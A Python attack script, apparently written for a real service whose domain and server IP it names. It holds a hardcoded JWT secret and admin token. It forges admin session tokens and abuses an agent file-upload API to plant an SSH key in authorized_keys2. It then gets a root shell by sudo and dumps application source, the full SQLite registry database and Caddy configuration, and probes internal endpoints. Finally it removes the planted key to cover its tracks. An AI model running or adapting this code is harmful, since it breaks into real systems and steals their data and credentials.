#!/usr/bin/env python3
# i29399 round c: lean single-ssh recon of registry (source+sqlite+caddy) with re-upload retry; no recursive greps.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST="dashboard.lumiiai.cn"; JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="; ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
KEY="/tmp/akc29399c"; START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60,stdin=None):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout,stdin=stdin); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,session=None,admin=False,timeout=30,maxlen=200000):
    url="https://%s%s"%(HOST,path)
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if session: a+=["-H","Cookie: session="+session]
    if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
    if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+20); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid,cust="aro"):
    now=int(time.time())
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
    return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())
def ssh_script(script,timeout=140):
    p="/tmp/rc29399.sh"; open(p,"w").write(script)
    args=["ssh","-i",KEY,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
          "-o","BatchMode=yes","-o","IdentitiesOnly=yes","-o","ConnectTimeout=15","-o","LogLevel=ERROR",
          "ubuntu@122.51.1.87","sudo bash -s"]
    with open(p,"rb") as f:
        return run(args,timeout=timeout,stdin=f)

def land_and_run(script, tries=3):
    run(["ssh-keygen","-t","ed25519","-N","","-f",KEY,"-q"],timeout=30)
    pub=open(KEY+".pub").read().strip(); open("/tmp/akc_keys2","w").write(pub+"\n")
    r=call("/api/admin/agents",admin=True,timeout=45)
    try: agents=(json.loads(r["body"]) or {}).get("agents",[])
    except: agents=[]
    byid={a.get("id"):a for a in agents if a.get("id")}
    order=[x.get("id") for x in sorted([x for x in agents if x.get("id")],key=lambda x:(0 if x.get("customer")=="aro" else 1, x.get("id") or ""))[:6]]
    for attempt in range(tries):
        landed=None
        for AID in order:
            x=byid.get(AID)
            if not x: continue
            cust=x.get("customer") or "aro"; orig={"ip":x.get("ip"),"sshUser":x.get("sshUser")}
            call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
            sess=forge("af0a2285-490f-11f1-ac43-525400595be1",cust)
            url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AID,up.quote("/home/ubuntu/.ssh",safe="/"))
            run(["curl","-s","-k","-m","50","--http2","-A",UA,"-H","Cookie: session="+sess,"-F","files=@/tmp/akc_keys2;filename=authorized_keys2;type=text/plain","-w","\n__C__%{http_code}",url],timeout=70)
            call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
            rc,out,err=ssh_script("id; hostname; echo GOT_SHELL",timeout=40)
            if b"GOT_SHELL" in out: landed=AID; break
        if landed:
            rc,out,err=ssh_script(script,timeout=150)
            txt=out.decode("utf-8","replace")
            return landed,rc,txt
        time.sleep(3)
    return None,-1,""

SR=(
 "echo @@A@@\n"
 "for f in admin-auth.ts instance-auth.ts wechat-login.ts app.ts main.ts db.ts; do echo \"###F:$f\"; head -c 12000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
 "echo @@B@@\n"
 "for f in market-images.ts cloud-environments.ts cloud-environment-config.ts onboard-ops.ts enterprise-ops.ts market-ops.ts validate.ts; do echo \"###F:$f\"; head -c 9000 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
 "echo @@C@@\n"
 "for f in push-secret.ts market-secret.ts project-permissions.ts package-facts.ts onboard-codes.ts market-store.ts market-cli.ts market-admin-page.ts; do echo \"###F:$f\"; head -c 4500 /opt/lumii-registry/src/$f 2>/dev/null; echo; done\n"
 "echo @@DBSCHEMA@@\n"
 "sqlite3 /var/lib/lumii-registry/registry.db '.schema' 2>&1 | head -c 24000\n"
 "echo @@DBTABLES@@\n"
 "sqlite3 /var/lib/lumii-registry/registry.db '.tables' 2>&1\n"
 "echo @@DBDUMP@@\n"
 "sqlite3 /var/lib/lumii-registry/registry.db '.dump' 2>&1 | head -c 52000\n"
 "echo @@DBSIZE@@\n"
 "stat -c%s /var/lib/lumii-registry/registry.db 2>/dev/null\n"
 "echo @@CADDY@@\n"
 "grep -n -iE 'registry|4080|reverse_proxy|handle|tls_server_name|cloud-ops|share' /etc/caddy/Caddyfile 2>/dev/null | head -60\n"
 "echo @@LOCALREG@@\n"
 "for p in / /health /api/health /api/version /api/admin/login /api/instance /api/market /api/apps /api/resolve /api/cloud-environments /api/enterprise /admin; do echo -n \"$p \"; curl -s -m5 -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:4080$p; done\n"
 "echo @@LAGREP@@\n"
 "grep -rIl 'LOGIN_ASSERTION' /opt/lumii-registry/src 2>/dev/null | head\n"
 "echo @@END@@\n"
)
landed,rc,txt=land_and_run(SR)
R("LAND",{"aid":landed,"ok":bool(landed),"rc":rc,"len":len(txt)})
open("/tmp/recon_c_raw.txt","w").write(txt)
print(txt[:500],flush=True)
# split
secs={}; cur=None; buf=[]
for line in txt.splitlines():
    m=re.match(r'^@@([A-Z_]+)@@$',line)
    if m:
        if cur: secs[cur]="\n".join(buf)
        cur=m.group(1); buf=[]
    elif cur is not None: buf.append(line)
if cur: secs[cur]="\n".join(buf)
for k,v in secs.items(): R("RCN_"+k, v[:72000])
if landed:
    ssh_script("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
